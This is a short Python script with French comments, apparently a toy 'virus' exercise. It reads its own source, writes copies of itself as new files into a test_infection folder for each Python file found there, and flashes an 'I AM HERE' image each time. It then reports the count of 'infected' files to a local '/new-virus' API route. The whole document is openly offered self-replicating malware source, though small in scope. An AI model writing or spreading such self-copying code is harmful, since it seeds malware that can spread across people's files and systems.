
import cv2
import os
import random
import requests

# ouvrir le fichier source
with open('infestation.py', 'r') as f:
    source_code = f.read()

# specifiez le chemin d'acces au dossier pour ecrire les fichiers
folder_path = "test_infection/"
infected_files_count = 0  # initialisation du compteur

# parcourir tous les fichiers du dossier
for i, filename in enumerate(os.listdir(folder_path)):
    # verifiez que le fichier est un fichier Python
    if filename.endswith(".py"):
        # ouvrir le fichier et ecrire le code source
        with open(os.path.join(folder_path, f"infestation_{i}.py"), 'w') as f:
            f.write(source_code)
            # Chemin d'accès au dossier contenant les images
            images_folder = "I_AM_HERE/"

            # Sélectionnez une image aléatoire à partir du dossier
            image_file = random.choice(os.listdir(images_folder))
            image_path = os.path.join(images_folder, image_file)

            # Chargez l'image et affichez-la
            image = cv2.imread(image_path, cv2.IMREAD_ANYCOLOR)
            cv2.imshow("I AM HERE", image)
            cv2.waitKey(800)

            # Détruisez la fenêtre d'affichage
            cv2.destroyWindow("I AM HERE")
            infected_files_count += 1  # incrémenter le compteur

# appel de la route API POST avec le nombre de fichiers infectés
url = "https://127.0.0.1:8000/new-virus"
data = {"infected_files_count": infected_files_count}
response = requests.post(url, json=data)